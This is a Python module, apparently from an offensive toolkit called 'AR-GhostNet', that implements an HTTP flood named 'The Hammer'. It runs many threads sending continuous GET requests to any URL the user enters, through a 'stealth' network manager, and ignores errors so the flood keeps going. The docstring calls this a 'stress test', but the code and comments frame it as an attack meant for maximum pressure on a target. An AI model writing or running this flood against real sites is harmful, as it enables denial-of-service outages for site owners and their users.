# AR-GhostNet | Module: HTTP Hammer (The Hammer)
# Location: modules/stresser/http_hammer.py

import threading
import random
import time
from concurrent.futures import ThreadPoolExecutor
from utils.colors import Colors
from core.network_manager import NetworkManager

class HTTPHammer:
    def __init__(self, threads=50):
        self.net_manager = NetworkManager()
        self.threads = threads
        self.is_running = False
        self.request_count = 0
        self.lock = threading.Lock()

    def attack_worker(self, target_url):
        """Single worker that sends continuous requests."""
        while self.is_running:
            try:
                # Use our stealth NetworkManager for the flood
                # We send a GET request to the home page repeatedly
                self.net_manager.send_request('GET', target_url)
                
                with self.lock:
                    self.request_count += 1
                    if self.request_count % 100 == 0:
                        Colors.log_info(f"Hammering... Total requests sent: {self.request_count}")
            except Exception:
                pass # Ignore errors to keep the flood going

    def start_hammer(self, target_url, duration=60):
        """
        Main function to launch the stress test.
        duration: How many seconds the attack will last.
        """
        if not target_url.startswith("http"):
            target_url = "http://" + target_url

        self.is_running = True
        self.request_count = 0
        
        Colors.log_info(f"Launching The Hammer against: {target_url}")
        Colors.log_info(f"Deploying {self.threads} threads for {duration} seconds...")
        
        # Using ThreadPoolExecutor to manage the flood
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Start all threads
            for _ in range(self.threads):
                executor.submit(self.attack_worker, target_url)
            
            # Wait for the duration to complete
            time.sleep(duration)
            self.is_running = False

        Colors.log_success(f"Hammering Complete. Total requests sent: {self.request_count}")
        Colors.log_info("Target stability checked.")

# Testing Block
if __name__ == "__main__":
    hammer = HTTPHammer(threads=100) # High thread count for maximum pressure
    target = input("Enter Target URL (e.g., http://example.com): ")
    seconds = int(input("Enter duration in seconds (e.g., 30): "))
    hammer.start_hammer(target, duration=seconds)